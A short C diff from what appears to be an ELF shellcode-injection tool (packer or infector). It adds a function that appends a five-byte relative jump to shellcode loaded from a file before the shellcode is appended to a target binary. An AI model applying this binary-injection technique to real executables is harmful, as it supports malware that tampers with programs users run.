@@ -12,7 +12,20 @@ typedef struct  s_file {
   Elf64_Ehdr  *header;
 }               t_file;
 
-static t_file  getShellcode(void) {
+static t_file patchShellcode(t_file shellcode) {
+  char  ins[] = {0xe9, 0xfb, 0xff, 0xff, 0xff};
+  char  *header;
+
+  header = mmap(NULL, shellcode.size + 5, PROT_READ | PROT_WRITE, MAP_ANON | MAP_PRIVATE, -1, 0);
+  memcpy(header, shellcode.header, shellcode.size);
+  memcpy(header + shellcode.size, ins, 5);
+  munmap(shellcode.header, shellcode.size);
+  shellcode.size += 5;
+  shellcode.header = (Elf64_Ehdr *)header;
+  return (shellcode);
+}
+
+static t_file getShellcode(void) {
   int         fd;
   struct stat stats;
   t_file      shellcode;
@@ -23,7 +36,7 @@ static t_file  getShellcode(void) {
   fd = open("shellcode", O_RDONLY);
   shellcode.header = mmap(NULL, shellcode.size, PROT_READ | PROT_WRITE, MAP_PRIVATE, fd, 0);
   close(fd);
-  return (shellcode);
+  return (patchShellcode(shellcode));
 }
 
 static int  appendShellcode(t_file *bin, t_file shellcode) {
